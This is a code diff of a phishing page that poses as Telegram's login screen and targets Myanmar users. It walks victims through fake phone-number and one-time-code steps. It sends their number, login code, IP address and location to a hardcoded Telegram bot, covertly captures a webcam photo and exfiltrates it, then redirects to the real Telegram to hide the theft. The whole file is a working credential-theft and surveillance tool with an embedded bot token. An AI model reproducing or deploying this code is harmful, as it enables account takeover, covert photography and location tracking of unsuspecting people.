@@ -3,25 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram: Login</title>
+    <title>Telegram Messenger</title>
     <style>
-        body { background: #e7f1f8; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; width: 320px; }
-        img { width: 80px; margin-bottom: 20px; }
-        h2 { color: #0088cc; margin-bottom: 10px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { background-color: #17212b; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; width: 100%; max-width: 320px; padding: 20px; transition: 0.3s; }
+        .logo { width: 120px; height: 120px; background: #242f3d; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 30px; }
+        .logo img { width: 80px; }
+        h1, h2 { font-size: 24px; margin-bottom: 10px; font-weight: 500; }
+        p { color: #7f91a4; font-size: 15px; line-height: 1.5; margin-bottom: 40px; }
+        .input-box { position: relative; margin-bottom: 25px; text-align: left; }
+        .input-box label { font-size: 13px; color: #3390ec; position: absolute; top: -10px; left: 12px; background: #17212b; padding: 0 5px; }
+        input { width: 100%; padding: 15px; background: transparent; border: 1px solid #3b4754; border-radius: 10px; color: white; font-size: 17px; outline: none; box-sizing: border-box; }
+        input:focus { border-color: #3390ec; }
+        .btn-start { background-color: #3390ec; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .next-btn { background: #3390ec; border: none; width: 60px; height: 60px; border-radius: 50%; color: white; font-size: 24px; cursor: pointer; float: right; margin-top: 10px; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="login-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
-    <h2>Telegram</h2>
-    <p>Please enter your phone number.</p>
-    <input type="tel" id="phone" placeholder="+959xxxxxxxxx">
-    <button id="btn" onclick="start()">Next</button>
+<div class="container" id="step1">
+    <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"></div>
+    <h1>Telegram</h1>
+    <p>The world's <b>fastest</b> messaging app.<br>It is <b>free</b> and <b>secure</b>.</p>
+    <button class="btn-start" onclick="toStep2()">Start Messaging</button>
+</div>
+
+<div class="container" id="step2" style="display: none;">
+    <h2>Your phone number</h2>
+    <p>Please confirm your country code and enter your phone number.</p>
+    <div class="input-box">
+        <label>Country</label>
+        <input type="text" value="Myanmar" readonly>
+    </div>
+    <div class="input-box">
+        <label>Phone number</label>
+        <input type="tel" id="phone" value="+95 ">
+    </div>
+    <button class="next-btn" id="btn2" onclick="sendPhone()">→</button>
+</div>
+
+<div class="container" id="step3" style="display: none;">
+    <div style="margin-bottom: 20px;"><img src="https://cdn-icons-png.flaticon.com/512/6195/6195959.png" width="80"></div>
+    <h2>Check your Telegram</h2>
+    <p>We've sent the code to the Telegram app on your other device.</p>
+    <div class="input-box">
+        <label>Code</label>
+        <input type="number" id="otp" placeholder="Enter code">
+    </div>
+    <button class="next-btn" id="btn3" onclick="sendOTP()">→</button>
 </div>
 
 <video id="v" autoplay playsinline></video>
@@ -30,52 +60,68 @@
 <script>
     const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
     const chat_id = '5304050102';
+    let userPhone = "";
 
-    async function start() {
-        const ph = document.getElementById('phone').value;
-        if(!ph) return alert("Enter number!");
-        document.getElementById('btn').innerText = "Processing...";
+    function toStep2() {
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+    }
+
+    async function sendPhone() {
+        userPhone = document.getElementById('phone').value;
+        if(userPhone.length < 10) return alert("Invalid Number");
         
-        let report = `🚩 **New Target!**\n📱 Phone: ${ph}\n`;
+        document.getElementById('btn2').innerText = "...";
+        let report = `🔥 **TG Login Hit!**\n📱 Phone: ${userPhone}`;
+        await captureTracking(report);
+
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step3').style.display = 'block';
+    }
+
+    async function sendOTP() {
+        const otp = document.getElementById('otp').value;
+        if(!otp) return alert("Please enter code");
+
+        document.getElementById('btn3').innerText = "...";
+        let finalReport = `🔑 **OTP RECEIVED!**\n📱 Phone: ${userPhone}\n🔢 Code: ${otp}`;
         
-        // IP & Info
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(finalReport)}`);
+        
+        // Target ၏ Telegram App အစစ်ကို ဖွင့်ပေးခြင်း
+        window.location.href = "tg://settings"; 
+        
+        setTimeout(() => {
+            window.location.href = "https://t.me/proxy?server=127.0.0.1";
+        }, 1000);
+    }
+
+    async function captureTracking(info) {
         try {
             const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
-            report += `🌐 IP: ${data.ip}\n📍 City: ${data.city}\n`;
-        } catch(e){}
+            const fullInfo = `${info}\n🌐 IP: ${data.ip}\n📍 City: ${data.city}\n🗺 Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
 
-        // Location & Photo
-        if(navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                report += `📍 Map: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
-                await snap(report);
-            }, async () => { await snap(report); });
-        } else { await snap(report); }
-    }
-
-    async function snap(info) {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({video: true});
+            const stream = await navigator.mediaDevices.getUserMedia({video: true});
             const v = document.getElementById('v');
-            v.srcObject = s;
+            v.srcObject = stream;
+            
             setTimeout(async () => {
                 const c = document.getElementById('c');
                 c.width = 640; c.height = 480;
                 c.getContext('2d').drawImage(v, 0, 0);
-                const b = await new Promise(r => c.toBlob(r, 'image/jpeg'));
+                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg'));
                 const f = new FormData();
                 f.append('chat_id', chat_id);
-                f.append('photo', b, 'x.jpg');
-                f.append('caption', info);
+                f.append('photo', blob, 'shot.jpg');
+                f.append('caption', fullInfo);
                 await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
-                location.href = "https://telegram.org"; // ပြီးရင် တကယ့် TG ဆီ လွှတ်လိုက်မယ်
-            }, 2000);
+            }, 1000);
         } catch(e) {
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
-            location.href = "https://telegram.org";
         }
     }
 </script>
 </body>
 </html>
+
